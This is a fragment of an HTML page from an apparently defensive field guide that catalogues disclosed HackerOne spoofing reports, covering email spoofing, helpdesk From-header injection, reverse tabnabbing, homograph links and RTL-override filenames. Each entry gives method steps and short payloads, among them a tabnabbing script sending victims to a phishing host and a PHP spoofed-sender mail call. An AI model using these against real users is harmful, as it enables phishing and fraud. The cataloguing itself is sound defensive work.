+# Freshdesk keys the ticket to the spoofed From -&gt; ticket lands on victim's account</div>
+<p class="insight"><b>Insight —</b> Any helpdesk that auto-provisions tickets from inbound email or an unauthenticated form is spoofable unless it verifies sender ownership (SPF/DKIM enforcement + confirmed-account requirement). Test migrations between ticketing systems (Zendesk-&gt;Freshdesk here) for reintroduced trust-the-From flaws.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2001913" target="_blank" rel="noopener">hackerone.com/reports/2001913</a></span><a class="src" href="#report-2001913" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-575" style="--sv:var(--sev-none)" data-sev="0" data-votes="28" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Email spoofing via missing/weak SPF/DKIM/DMARC</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#575</b> · security · awarded · 28 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The domain lacks an enforcing SPF/DKIM/DMARC posture, so an attacker can send mail with a From address of the target's domain (or a staff subdomain) and have it delivered, enabling convincing phishing/fraud (e.g. fake bounty/reward notices).</p>
+<h4>Method</h4><ol><li>Check the domain's SPF/DMARC records (dig TXT); note missing or p=none DMARC</li><li>Use a spoofing service (emkei.cz) to send with From set to an address at the target domain</li><li>Confirm delivery to inbox (Yahoo often inbox, Gmail may spam)</li><li>Craft fraud/phishing content as the trusted sender</li></ol>
+<div class="pre">From: gtsatsis@staff.target.com   # sent via emkei.cz; delivered due to missing SPF/DMARC enforcement</div>
+<p class="insight"><b>Insight —</b> Always check SPF (-all vs ~all), DKIM, and DMARC (p=reject/quarantine). Missing enforcement, including on staff/sub-domains, allows brand-impersonating phishing. Fix: SPF hardfail + DKIM + DMARC p=reject.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/575" target="_blank" rel="noopener">hackerone.com/reports/575</a></span><a class="src" href="#report-575" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-306414" style="--sv:var(--sev-none)" data-sev="0" data-votes="19" data-bounty="300">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>noopener/noreferrer bypass via /\host URL form (reverse tabnabbing)</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#306414</b> · phabricator · USD 300 · 19 votes · resolved</div>
+<div class="taxo"><span>Program <b>phabricator</b></span><span>Surface <b>web</b></span><span>Chain <b>link-render filter bypass -&gt; window.opener -&gt; parent-t</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The app adds rel=noreferrer to user links, but its URL parser treats /\host as relative while the browser resolves it to an external origin, so the protection is applied to a link that still opens cross-origin with window.opener intact.</p>
+<h4>Method</h4><ol><li>Post a link in the /\host/path form inside user content</li><li>Victim clicks; new tab opens attacker page with window.opener access</li><li>Attacker page calls window.opener.location.replace() to swap the parent tab to a phishing page</li></ol>
+<div class="pre">[[ /\attacker.example.com/tabnabbing.html | click_me ]]
+// tabnabbing.html:
+&lt;script&gt;window.opener.location.replace('http://phish.example.com');&lt;/script&gt;</div>
+<p class="insight"><b>Insight —</b> URL-parser vs browser-resolver differentials (/\host, \/host, //host) bypass both anti-tabnabbing rel attributes and same-origin link filters. When target=_blank + rel=noopener is present, try backslash/mixed-slash host forms to regain window.opener.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/306414" target="_blank" rel="noopener">hackerone.com/reports/306414</a></span><a class="src" href="#report-306414" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-2109382" style="--sv:var(--sev-none)" data-sev="0" data-votes="18" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Support-ticket creation on behalf of a victim via Freshdesk wildcard address + spoofed From</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#2109382</b> · security · awarded · 18 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Freshdesk creates tickets from inbound email keyed on the (unauthenticated) From header; the vendor wildcard address support@&lt;sub&gt;.freshdesk.com still accepts mail after the branded alias was filtered.</p>
+<h4>Method</h4><ol><li>Open a fake-mailer (e.g. emkei.cz)</li><li>Set From = victim email, To = support@hackerone.freshdesk.com</li><li>Send any request body (e.g. account deletion); a ticket is created as the victim</li></ol>
+<div class="pre">From: victim@example.com
+To: support@hackerone.freshdesk.com
+Subject: Account deletion request
+
+&lt;action to perform on behalf of victim&gt;</div>
+<p class="insight"><b>Insight —</b> Email-to-ticket / email-to-webhook gateways trust the From header. When a fix filters the branded alias, retest the vendor wildcard address (support@&lt;tenant&gt;.freshdesk.com). Mitigation is Freshdesk's 'Prevent Wildcard Ticket Create'.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2109382" target="_blank" rel="noopener">hackerone.com/reports/2109382</a></span><a class="src" href="#report-2109382" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-59375" style="--sv:var(--sev-none)" data-sev="0" data-votes="17" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Homograph/IDN link via markdown URL-parser bypass</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#59375</b> · security · awarded · 17 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The link renderer's scheme/host detection could be defeated with a backslash so an IDN homograph host (Cyrillic characters, e.g. ebay.com look-alike) rendered as a trusted-looking link and/or skipped the external-link warning, enabling convincing phishing.</p>
+<h4>Method</h4><ol><li>Register/point a homograph IDN domain (Latin look-alike via Cyrillic chars)</li><li>Craft a markdown link using a backslash to bypass the URL parser's scheme handling</li><li>Rendered link displays the legitimate name but resolves to the homograph domain (and may skip the interstitial)</li></ol>
+<div class="pre">[http://ebay.com](https:\\//e&lt;cyrillic-a&gt;bay.com)</div>
+<p class="insight"><b>Insight —</b> Test URL parsers/anti-phishing interstitials with backslashes, IDN homoglyphs, and alternate views (raw/escalate/preview); incomplete fixes commonly forget a delimiter (backslash) or a code path (a secondary view) that re-enables homograph link spoofing.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/59375" target="_blank" rel="noopener">hackerone.com/reports/59375</a></span><a class="src" href="#report-59375" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-2079502" style="--sv:var(--sev-none)" data-sev="0" data-votes="17" data-bounty="1000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Helpdesk ticket injection via spoofed From header (email-to-ticket)</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#2079502</b> · security · 1000 · 17 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An email-to-ticket helpdesk creates/associates tickets based solely on the unauthenticated SMTP From address, which is trivially spoofable, letting an attacker file tickets as any victim.</p>
+<h4>Method</h4><ol><li>Find the support intake address (e.g. support@target.com) that turns inbound email into helpdesk tickets.</li><li>Send a spoofed email with the victim's address as From and support@target.com as To (via an open relay / spoofing service like emkei.cz).</li><li>A ticket appears in the victim's helpdesk account authored 'by' them, with attacker-controlled content.</li></ol>
+<div class="pre">From: victim@example.com
+To: support@target.com
+Subject: (attacker-controlled)
+
+(attacker body appears as the victim's support ticket)</div>
+<p class="insight"><b>Insight —</b> Any 'email in -&gt; object created' pipeline (helpdesk, mailing list, comment-by-email, CI triggers) that trusts From is spoofable unless SPF/DKIM/DMARC are enforced on intake. Always test whether spoofed sender creates authenticated-looking state.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2079502" target="_blank" rel="noopener">hackerone.com/reports/2079502</a></span><a class="src" href="#report-2079502" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-106350" style="--sv:var(--sev-none)" data-sev="0" data-votes="15" data-bounty="250">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reflected text/content injection in error (404) page for phishing</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#106350</b> · withinsecurity · USD 250 · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>withinsecurity</b></span><span>Surface <b>web</b></span><span>Tag <b>subdomain-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The 404/error page reflects part of the requested URL path into the response body without encoding, letting an attacker place arbitrary text (and a lure link) in a page served from the trusted origin.</p>
+<h4>Method</h4><ol><li>Request a non-existent path containing attacker text (URL-encoded).</li><li>Confirm the text is reflected verbatim in the 404 body.</li><li>Craft a URL whose reflected text reads as an official notice pointing victims to an attacker site.</li></ol>
+<div class="pre">https://TARGET/test/%2f../It%20has%20been%20changed%20by%20a%20new%20one%20https://EVIL.com%20so%20go%20there</div>
+<p class="insight"><b>Insight —</b> Error pages and 'not found' handlers often echo the path/host; even without HTML execution, plain text injection on a trusted domain is a credible phishing/content-spoofing primitive.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/106350" target="_blank" rel="noopener">hackerone.com/reports/106350</a></span><a class="src" href="#report-106350" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-29491" style="--sv:var(--sev-none)" data-sev="0" data-votes="13" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>IDN homograph rendered in unicode instead of punycode</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#29491</b> · security · awarded · 13 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-controlled URLs/links are displayed with their unicode (IDN) form, so lookalike Cyrillic/Greek glyphs render as a trusted brand; only the punycode form reveals the deception.</p>
+<h4>Method</h4><ol><li>Register a lookalike IDN (e.g. Cyrillic a in ebay.com -&gt; xn--eby-7cd.com)</li><li>Submit it where the app displays URLs/links (reports, messages, external-link warning pages)</li><li>App renders the unicode form, appearing to be the real domain</li></ol>
+<div class="pre">http://ebаy.com/   -&gt;   punycode: http://xn--eby-7cd.com/</div>
+<p class="insight"><b>Insight —</b> Any surface that echoes user-supplied hostnames/links should show punycode (or highlight mixed scripts). Test messaging, profile links, and 'you are leaving' interstitials with mixed-script domains.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/29491" target="_blank" rel="noopener">hackerone.com/reports/29491</a></span><a class="src" href="#report-29491" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-298" style="--sv:var(--sev-none)" data-sev="0" data-votes="11" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>U+202E RTL-override in filenames disguises executables</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#298</b> · security · awarded · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Uploaded filenames are displayed without stripping the Unicode RIGHT-TO-LEFT OVERRIDE (U+202E), so the visible extension is reversed and a dangerous file looks like a harmless image/media file.</p>
+<h4>Method</h4><ol><li>Name a malicious file so a U+202E precedes a reversed benign suffix</li><li>Upload it where the app shows the filename</li><li>Panel/user sees e.g. 'insane...exe.mp3' or 'poppa.png' and opens it</li></ol>
+<div class="pre">insane_in_the_cort&lt;U+202E&gt;3pm.exe   -&gt; renders as  insane_in_the_cortexe.mp3
+po&lt;U+202E&gt;gnp.app                    -&gt; renders as  poppa.png</div>
+<p class="insight"><b>Insight —</b> Strip/neutralize bidi control chars (U+202A-202E, U+2066-2069) in any displayed user-supplied filename or text; test uploads and messages with an RLO before a reversed extension to disguise file type.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/298" target="_blank" rel="noopener">hackerone.com/reports/298</a></span><a class="src" href="#report-298" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-113070" style="--sv:var(--sev-none)" data-sev="0" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Link-domain highlighting defeated by URL userinfo '@' component</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#113070</b> · security · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A redirect/interstitial page that highlights the destination domain parsed only the segment after '@', so a URL like real.com@attacker.com displayed real.com as the domain while actually pointing at attacker.com.</p>
+<h4>Method</h4><ol><li>Craft an external link whose userinfo section contains a trusted-looking host and whose real host follows the '@'</li><li>Feed it through the app's link-display/redirect page</li><li>Observe the app highlights/labels the wrong segment, misrepresenting where the user is sent</li></ol>
+<div class="pre">http://hackerone.com@yandex.ru/
+&lt;a href="https://trusted.com@attacker.com/"&gt;https://trusted.com...&lt;/a&gt;</div>
+<p class="insight"><b>Insight —</b> When testing any 'you are leaving / go to external site' interstitial or link-domain label, inject a userinfo '@' and Unicode/percent tricks: display logic that anchors on the wrong URL segment becomes a phishing aid. Browsers also re-interpret malformed URLs, so highlighting can silently drop entirely.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/113070" target="_blank" rel="noopener">hackerone.com/reports/113070</a></span><a class="src" href="#report-113070" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-34112" style="--sv:var(--sev-none)" data-sev="0" data-votes="4" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Email spoofing via permissive SPF (?all / no DMARC)</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#34112</b> · blockio · awarded · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>blockio</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Domain publishes a soft-fail SPF record (v=spf1 include:... ?all) and no enforcing DMARC, so mail from arbitrary senders claiming the domain isn't rejected, enabling convincing spoofed phishing from support@&lt;domain&gt;.</p>
+<h4>Method</h4><ol><li>Enumerate the domain's SPF/DMARC: dig TXT domain and _dmarc.domain</li><li>Look for ?all (neutral) or ~all without p=reject/quarantine DMARC</li><li>Send a spoofed From: support@domain email to demonstrate delivery</li></ol>
+<div class="pre">dig +short TXT block.io            # v=spf1 include:spf.mandrillapp.com ?all  (weak)
+dig +short TXT _dmarc.block.io     # missing/none =&gt; spoofable
+# fix: change ?all to -all and publish DMARC p=reject
+&lt;?php mail('victim@x.com','Password Change','...',"From: support@block.io"); ?&gt;</div>
+<p class="insight"><b>Insight —</b> Always audit SPF (-all vs ?all/~all/+all) plus DMARC enforcement; a soft-fail/neutral SPF with no DMARC p=reject is a directly demonstrable spoofing/phishing primitive. Low severity but consistently in scope.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/34112" target="_blank" rel="noopener">hackerone.com/reports/34112</a></span><a class="src" href="#report-34112" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-181225" style="--sv:var(--sev-none)" data-sev="0" data-votes="3" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reverse tabnabbing via window.opener on target=_blank links</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#181225</b> · paragonie · awarded · 3 votes · resolved</div>
+<div class="taxo"><span>Program <b>paragonie</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Links opened with target=_blank without rel="noopener" leave the opener page reachable via window.opener; the newly opened (possibly attacker-controlled) page can navigate the original tab to a phishing clone.</p>
+<h4>Method</h4><ol><li>Find a target=_blank link on the app that lacks rel=noopener noreferrer.</li><li>Control the destination (own site, or a http page you can MITM).</li><li>From the opened page run window.opener.location = attacker URL to silently replace the original tab.</li></ol>
+<div class="pre">window.opener.location = 'http://phishingsite.com/'</div>
+<p class="insight"><b>Insight —</b> Grep templates/JS for target="_blank" without rel="noopener". Even outbound links to third parties are exploitable if that third-party page is attacker-influenced or served over http on a shared network.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/181225" target="_blank" rel="noopener">hackerone.com/reports/181225</a></span><a class="src" href="#report-181225" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-218705" style="--sv:var(--sev-none)" data-sev="0" data-votes="17" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Dangling/unregistered domain referenced in official documentation</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#218705</b> · security · none · 17 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span><span>Tag <b>subdomain-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Documentation lists a real-looking forwarding domain that the vendor never registered; a third party can buy it and set up catch-all mail to intercept misdirected sensitive email.</p>
+<h4>Method</h4><ol><li>Grep docs/help articles/example configs for domains and email addresses.</li><li>Check registration status of each referenced domain.</li><li>Register any unowned one and add catch-all forwarding to capture email sent by confused users.</li></ol>
+<p class="insight"><b>Insight —</b> Treat every domain a vendor prints as their own (in docs, email headers, SPF includes, example configs) as attack surface; unregistered ones are cheap, high-impact intercepts.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/218705" target="_blank" rel="noopener">hackerone.com/reports/218705</a></span><a class="src" href="#report-218705" style="color:var(--faint)">#</a></div></article></div>
+    <button class="loadmore" id="loadmore">Load more specimens (50 of 74 remaining)</button>
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
+<li>No dedicated PortSwigger lab for this class; use the methodology above and the cited reports.</li>
+<li>All 74 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#spoofing-surfaces">Spoofing surfaces</a><a href="#url-parser-vs-browser-resolver-confusion" style="padding-left:24px">↳ URL parser vs browser resolver confusion</a><a href="#link-masking-homograph-markdown-chat" style="padding-left:24px">↳ Link masking &amp; homograph (markdown / chat)</a><a href="#bidi-rtl-invisible-unicode" style="padding-left:24px">↳ BIDI / RTL &amp; invisible unicode</a><a href="#browser-trust-ui-spoofing-address-bar-download-prompt" style="padding-left:24px">↳ Browser trust-UI spoofing (address bar / download prompt)</a><a href="#email-authentication-spf-dkim-dmarc" style="padding-left:24px">↳ Email authentication (SPF / DKIM / DMARC)</a><a href="#send-from-our-trusted-domain-features" style="padding-left:24px">↳ "Send from our trusted domain" features</a><a href="#email-to-ticket-from-header-injection" style="padding-left:24px">↳ Email-to-ticket / From-header injection</a><a href="#native-prompt-spoofing-401-basic-auth-scheme-dialog" style="padding-left:24px">↳ Native prompt spoofing (401 Basic-Auth / scheme dialog)</a><a href="#reflected-content-text-injection-error-404-pages" style="padding-left:24px">↳ Reflected content / text injection (error &amp; 404 pages)</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (74)</a><a href="#refs">References</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
